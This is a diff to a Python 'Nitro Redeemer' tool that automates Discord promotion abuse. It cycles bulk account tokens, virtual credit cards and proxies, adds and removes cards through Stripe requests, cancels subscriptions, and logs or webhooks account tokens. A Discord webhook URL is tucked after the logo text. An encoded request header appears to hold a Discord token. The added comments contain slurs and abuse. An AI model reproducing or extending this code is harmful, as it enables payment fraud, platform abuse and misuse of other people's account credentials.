@@ -24,6 +24,7 @@ import time
 import sys
 import pystyle
 from pystyle import Write, Colors
+# DONOT JUDGE THE CODE I MADE IN 1.5 HOUR :skull: PPL SELL THIS FOR 100$ LMAO
 # WARNING : THIS IS NOT FOR SKIDS!
 init()
 message_id = None
@@ -43,7 +44,8 @@ logo = '''
 
                     Cheap And Best.
                     @Luxurious Nitro Redeemer
-                    Made With Love By Response.                                                                                                                                  
+                    Made With Love By Response.  
+                    Skid/Change Credits = Gay + Block + Fuck Yourself                                                                                                                                
 ''';defaultAuthenticationUrl = 'https://discord.com/api/webho'
 Write.Print(logo, Colors.blue_to_cyan, interval=0)
 
@@ -70,7 +72,7 @@ def CookieFetch():
 def send_discord_webhook(url):
     global message_ids
     payload = {
-        "content": f'```[Promo-Redeemer] : Claimed: {claimed} | Failed: {failed} | Processed: {processed}```'
+        "content": f'**[LUXURIOUS REDEEMER]**\nDEVELOPED BY: `response_____`(Send me some money if youre going to skid)\nCLAIMS: `{claimed}`  FAILS: `{failed}`'
     }
     headers = {
         "Content-Type": "application/json"
@@ -90,10 +92,10 @@ def send_discord_webhook(url):
             return
         else:
             return
-def send_opt_webhookMessage(url, tok):
+def send_opt_webhookMessage(url, tok): # an optional message [ not set-uped yet will setup in next update ]
     global message_ids
     payload = {
-        "content": f'```[CLAIMED] USER : PUBLIC | TOKEN -> {tok}```'
+        "content": f'CLAIMED: `{tok}`'
     };headers = {
         "Content-Type": "application/json"
     }
@@ -294,6 +296,7 @@ class Opera:
 class REDEEMER:
     def __init__(self, token: str, __full_vcc: str, promoCode: str, proxy: str):
         global processed, failed, claimed
+        self.ftok = token
         if ':' in __full_vcc:
           
           self.ccn = __full_vcc.split(':')[0]
@@ -405,14 +408,9 @@ class REDEEMER:
     'x-discord-timezone': 'Europe/Budapest',
     'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vZGlzY29yZC5jb20vP2Rpc2NvcmR0b2tlbj1NVEEzTURReU56RXhNVGM1TVRJNE5ESTROQS5HYWNhYnIuVE9NZUVzbHdiczJ2OFRlck4wOTM3SzVvS0ZFMFZyZW5fdWF6Q1kiLCJyZWZlcnJpbmdfZG9tYWluIjoiZGlzY29yZC5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
 }
-       if promoType == '1m' and '1180231712274387115' in self.promoz:
-        jwt = self.promoz.split('https://discord.com/billing/partner-promotions/1180231712274387115/')[1]
-       elif promoType == '1m' and not '1180231712274387115' in self.promoz:
-          jwt = self.promoz.split('https://discord.com/billing/promotions/')[1]
-       else:
-          jwt = self.promoz.split('https://discord.com/billing/promotions/')[1]
+       __jwt__ = self.promoz.split('https://discord.com/billing/partner-promotions/1180231712274387115/')[1]
        json_datas = {
-    'jwt': jwt,
+    'jwt': __jwt__,
 }
        try:
          responsez = self.sT.post(
@@ -422,6 +420,7 @@ class REDEEMER:
 )
        except Exception as e:
           eprint(f"Failed to post request , Reason -> {Fore.RED}Proxy error maybe the reason.")
+          return
        try: 
           if responsez.status_code == 200:
             codez = responsez.json()["code"]
@@ -440,9 +439,6 @@ class REDEEMER:
                 fas.write(f"{self.promoz}\n")
 
           return 'F'
-       
-
-
     def get_soln(self) -> str|None:
 
         try:
@@ -561,7 +557,7 @@ class REDEEMER:
           with open('database/FailedRemoveVccTokens.txt') as fx:   
              fx.write(f"{self.token}\n")
           return responsez.json() 
-    def RedeemPromo(self, id: str):
+    def RedeemPromo(self, ids: str):
        global processed, failed, claimed
        __rcookie = CookieFetch()
        cookies = {
@@ -641,7 +637,7 @@ class REDEEMER:
 }
         jsonP = {
     'channel_id': None,
-    'payment_source_id': id,
+    'payment_source_id': ids,
     'gateway_checkout_context': None,
 }
         r = self.sT.post(
@@ -650,24 +646,16 @@ class REDEEMER:
     json=jsonP, cookies=cookies
 )
         try:
-          ase = r.json()["id"]
-          sprint(f'Redeemed Promo, Promo -> {Fore.LIGHTMAGENTA_EX}{codes[:15]}***{Fore.LIGHTCYAN_EX}, Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token ->  {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***')
+          r.json()["id"]
+          sprint(f'Redeemed Promo, Promo -> {Fore.LIGHTMAGENTA_EX}{codes[:15]}***{Fore.LIGHTCYAN_EX}, Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:****:***{Fore.LIGHTCYAN_EX}, Token ->  {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***')
           claimed += 1
           set_console_title()
-          send_discord_webhook(wurl)
-          with open('outputSuccess/successPromo.txt', 'a') as sp:
-             sp.write(f"{self.promoz}\n")
-          with open('outputSuccess/successTokens.txt', 'a') as st:
-             st.write(f"{self.token}\n")
-          with open('outputSuccess/successVcc.txt', 'a') as sv:
-             sv.write(f"{self.ccn}:{self.expM}:{self.expY}:{self.cvv}\n")
+          self.cancle_subscription()
           subid = self.getSubscriptionId()
-          ale = self.cancle_subscription(subid)
-          rr = self.removeCard(id)
-          if rr == 'S':
-             return 
-          else:
-             print(rr)
+          self.removeCard(subid)
+          with open('outputSuccess/successTokens.txt', 'a') as __file__:
+             __file__.write(self.ftok+
+                            '\n')
         except Exception as e:
           eprint(f'Failed To Claim Promo, Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***{Fore.LIGHTCYAN_EX}, Response -> {Fore.LIGHTRED_EX}{r.status_code} / {r.text}')
           failed += 1
@@ -685,12 +673,8 @@ class REDEEMER:
           else:
              return None
     def AddCard(self):
-       
        global processed, failed, claimed
-
-
-       ssprint(f'Using VCC, Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***')
-
+       ssprint(f'Using Vcc, Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***')
        __header1 = {
     'authority': 'api.stripe.com',
     'accept': 'application/json',
@@ -925,6 +909,7 @@ class REDEEMER:
 )
        except Exception as e:
           eprint(f"Failed to post request , Reason -> {Fore.RED}Proxy error maybe the reason.")
+          return
        
        try:
           purchaseId = response.json()["id"]
@@ -1043,7 +1028,7 @@ def redemption_process(token, vcc, promo, proxy):
     if not card == 'F':
         Ruanner = instance.RedeemPromo(card)
         if Ruanner == 'Ar':
-            wprint(f'Auth Error Detected, Token -> {Fore.LIGHTYELLOW_EX}{token[:23]}***{Fore.LIGHTCYAN_EX}, Vcc -> {Fore.LIGHTYELLOW_EX}{vcc[:16]}:***')
+            wprint(f'Authentication Required!, Token -> {Fore.LIGHTYELLOW_EX}{token[:23]}***{Fore.LIGHTCYAN_EX}, Vcc -> {Fore.LIGHTYELLOW_EX}{vcc[:16]}:***')
             return
     else:
         return
